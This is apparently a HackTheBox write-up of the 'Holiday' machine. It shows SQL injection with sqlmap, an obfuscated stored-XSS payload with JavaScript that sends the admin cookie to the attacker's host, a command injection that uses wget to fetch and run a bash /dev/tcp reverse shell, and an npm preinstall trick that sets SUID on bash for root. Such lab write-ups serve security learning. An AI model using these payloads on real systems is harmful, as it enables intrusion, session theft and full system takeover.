---
title: "HackTheBox: Holiday"
date: 2026-05-06
categories: [HackTheBox]
tags: [Linux, Web, SQLi, XSS, Command Injection, Privilege Escalation]
published: true
---

This box is rated hard difficulty on HTB. It involves us finding a login page which is vulnerable to SQL injection, allowing us to dump the users table to get site credentials. Then we abuse a note upload function to exploit a stored XSS vulnerability that enables us to steal the administrator's cookie. Using our elevated site permissions, we discover an export function that is prone to command injection, letting us get a reverse shell on the machine by uploading a file. Finally, this user can use NPM to install a malicious JSON package to escalate privileges to root.

## Host Scanning
I begin with an Nmap scan against the target IP to find all running services on the host; Repeating the same for UDP yields no results.

```
└─$ sudo nmap -p22,8000 -sCV 10.129.29.106 -oN fullscan-tcp

Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-06 17:56 -0400
Nmap scan report for 10.129.29.106
Host is up (0.054s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c3:aa:3d:bd:0e:01:46:c9:6b:46:73:f3:d1:ba:ce:f2 (RSA)
|   256 b5:67:f5:eb:8d:11:e9:0f:dd:f4:52:25:9f:b1:2f:23 (ECDSA)
|_  256 79:e9:78:96:c5:a8:f4:02:83:90:58:3f:e5:8d:fa:98 (ED25519)
8000/tcp open  http    Node.js Express framework
|_http-title: Error
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.27 seconds
```

There are just two ports open: 
- SSH on port 22
- A Node.js web server on port 8000

Other than potential username enumeration, there's not a whole lot we can do wiht that version of OpenSSH without credentials. I fire up Ffuf to search for subdirectories and subdomains on the web server before heading over there. 

## Website Enumeration
Checking out the landing page shows just an outline of a hexagon and no other content.

![](/assets/img/2026-05-06-Holiday/1.png)

Interestingly, my scans discover absolutely nothing which makes me think we'll need to manipulate our requests to search for functionality on this page. A few of my attempts at this included fuzzing for hidden URL parameters and .txt, .js, and .md files as well as looking at the image's metadata, however nothing came of them.

Capturing a request to the page in Burp Suite confirms that the site is built with Node.js via the `X-Powered-By: Express` response header, but it also returns a **304 Not Modified** code.

![](/assets/img/2026-05-06-Holiday/2.png)

A bit of digging shows that this status code indicates that the requested resource has not changed since the last time of access. When our browser receives this code, it loads the content from its local cache instead of re-downloading it from the server.

With this strange behavior from the site, I tested a few common pages to see if my tools were acting wonky which reveals a few that redirect me to a login page.

![](/assets/img/2026-05-06-Holiday/3.png)

A bit of fiddling around with different request structures shows that the site was most likely filtering our User Agent for any suspicious ones. Changing it to something arbitrary will return 404s but a short, valid UA such as Linux succeeds.

```
└─$ ffuf -u http://10.129.29.106:8000/FUZZ -w /opt/seclists/directory-list-2.3-medium.txt -H "User-Agent: Linux"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.29.106:8000/FUZZ
 :: Wordlist         : FUZZ: /opt/seclists/directory-list-2.3-medium.txt
 :: Header           : User-Agent: Windows NT 6.1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

img                     [Status: 301, Size: 165, Words: 7, Lines: 10, Duration: 85ms]
login                   [Status: 200, Size: 1171, Words: 148, Lines: 31, Duration: 90ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 59ms]
css                     [Status: 301, Size: 165, Words: 7, Lines: 10, Duration: 58ms]
js                      [Status: 301, Size: 163, Words: 7, Lines: 10, Duration: 62ms]
logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 59ms]
agent                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 106ms]
```

### SQL Injection
Testing this login panel for SQL injection with known bad characters returns an error code only while using double quotes. Anything else will respond with **"Invalid Username"**, which could let us enumerate valid users as well.

![](/assets/img/2026-05-06-Holiday/4.png)

That response almost guarantees that it's prone to SQLi, so I capture a POST request to this login page, save the whole thing to a file, and send it over to SQLmap to save on time.

```
└─$ sqlmap -r login.req --batch -level 5 -risk 3 --tables
```

![](/assets/img/2026-05-06-Holiday/5.png)

The results show that the site is using SQLite and the username field is vulnerable to boolean-based blind SQL injection, making this a pain to do manually. 

_Note: This could actually be done by hand as when attempting to bypass the username field with a `" OR "1"= "1` payload, the server responds with a username. From there it's just a few UNION injections away from dumping the users table._

Enumerating the tables gives us a few interesting ones to look at.

```
└─$ sqlmap -r login.req --batch -level 5 -risk 3 -T users --dump
```

![](/assets/img/2026-05-06-Holiday/6.png)

The users table gives us an MD5 hash for RickA which is easily crackable by sending it over to a site like [Hashes.com](https://hashes.com/en/decrypt/hash) or [Crackstation.net](https://crackstation.net/).

![](/assets/img/2026-05-06-Holiday/7.png)

### Stored Cross-Site Scripting
Dumping the other tables only gives us a few session identifiers that don't function, so I move on to the site's internals. As the title implies, this is used to manage bookings requests.

![](/assets/img/2026-05-06-Holiday/8.png)

Clicking on any of the UUID links brings us to the booking details page for each person. Hovering over the header's title reveals the hostname which can be added to our `/etc/hosts` file.

![](/assets/img/2026-05-06-Holiday/9.png)

We are able to add a note to each booking which looks to be reviewed by an administrator every minute or so. A test run shows that it doesn't block us from entering any special characters, making this a prime target for Cross-Site Scripting.

![](/assets/img/2026-05-06-Holiday/10.png)

## Exploitation

### Stealing Admin Cookie
I try a few payloads to see if the page will store it Unsanitized, however it seems like the page performs HTML encoding before storing it in the notes section. The same goes for URL-encoded payloads, however a simple test to fetch an attacker-owned resource works. This happens because the Admin renders the XSS payload which executes it, however sanitization occurs only after it's approved and stored in the notes section.

```
<img src=http://10.10.14.243/test />
```

![](/assets/img/2026-05-06-Holiday/11.png)

We can use this to steal the administrator's cookie and escalate privileges on the site. Attempting to use the standard document cookie payload for this fails due to the site filtering out single and double quotes. Referring to [PayloadAllTheThings' XSS cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) shows that we can bypass this by decoding it from CharCode.

I'll convert just the part between the `<script>` tags which include the bad characters, which could be done through Python or tools like CyberChef. This payload will execute our JavaScript hosted on our local machine, which will eventually capture their cookie.

```
└─$ python3
Python 3.13.12 (main, Feb  4 2026, 15:06:39) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> payload = '''document.write('<script src="http://10.10.14.243/test.js"></script>');'''
>>> ','.join([str(ord(c)) for c in payload])
'100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,52,51,47,116,101,115,116,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59'
```

It took a while of testing and going down lists of payloads wrappers, but I found this one to fetch the file from our HTTP server.

```
<img src="/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,52,51,47,116,101,115,116,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>" />
```

![](/assets/img/2026-05-06-Holiday/12.png)

Now we just need to write some JavaScript to send the victim's cookie back to our machine. I tried more simple code where it would fetch a non-existent page on another web server and document the cookie, but it kept failing to return anything. Eventually, I realized that the page wasn't being loaded by time it documented it, so I added an event listener that would resolve this issue.

```
window.addEventListener('DOMContentLoaded', function(e) {
    window.location = "http://10.10.14.243:1024/?log=" + encodeURI(document.getElementsByName("cookie")[0].value)
})
```

Sending another payload for review finally rewards us with an Administrator cookie which we can swap out to gain access to the `/admin` page.

![](/assets/img/2026-05-06-Holiday/13.png)

### Command Injection
This page allows us to export bookings and notes respectively, downloading them to our local machine in ASCII format.

![](/assets/img/2026-05-06-Holiday/14.png)

Capturing a request shows that we supply a table parameter which is pulled from the SQLite database.

![](/assets/img/2026-05-06-Holiday/15.png)

Every table succeeds except for the sqlite_master one which returns an error about our use of an underscore. The response tells us that ampersands are apart of the whitelist which was intriguing to me since SQLite doesn't use them in its queries.

![](/assets/img/2026-05-06-Holiday/16.png)

Depending on how this function is built, we may be able to use this ampersand to execute other commands. Attempting to use an it as apart of the export request succeeds after URL-encoding it, confirming that this page is vulnerable to command injection. 

![](/assets/img/2026-05-06-Holiday/17.png)

### Initial Foothold
Now, I use it to upload a reverse shell using wget and hex encoding my IP address since the site blocks the use of periods. We can do this from [CyberChef](https://gchq.github.io/CyberChef/) by converting our IP without periods from decimal to hex and then prepending 0x to the string.

![](/assets/img/2026-05-06-Holiday/18.png)

The reverse shell is just a bash one-liner:

```
└─$ cat shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.243/443 0>&1
```

My command to grab the shell was simply:

```
/admin/export?table=fake%26wget+0x0a0a0ef3/shell
```

Then we execute it the same way:

```
/admin/export?table=fake%26bash+shell
```

![](/assets/img/2026-05-06-Holiday/19.png)

At this point we can grab the user flag from their home directory and start looking at ways to escalate privileges to root.

## Privilege Escalation

### Abusing NPM with Sudo
Displaying the contents of Algernon's home directory reveal a .npm folder and listing Sudo permissions shows that we can execute that binary using the `i` option without a password.

![](/assets/img/2026-05-06-Holiday/20.png)

This is just shorthand for npm install, which means we can use this to install malicious JSON packages to the system. One feature of such packages is the use of preinstall scripts, which execute commands before the install takes place. [GTFOBins](https://gtfobins.org/gtfobins/npm/#shell) has a method for obtaining root privs via this binary, however we need to tweak it a bit.

By creating a new package with this option enabled, we can execute commands on behalf of root user, provided we supply the `--unsafe` flag in the install command. I order the system to give the bash binary an SUID bit, letting me spawn a root shell.

```
└─$ echo '{"scripts": {"preinstall": "chmod +s /bin/bash"}}' >package.json

└─$ sudo /usr/bin/npm i -C . --unsafe
```

![](/assets/img/2026-05-06-Holiday/21.png)

Finally, we can grab the root flag under their home directory to complete this challenge. Overall, this was an amazing box and I'd say this box's difficulty laid in troubleshooting the many payloads to get our exploits to actually work, rather than discovering them. I hope this was helpful to anyone following along or stuck like I was and happy hacking!
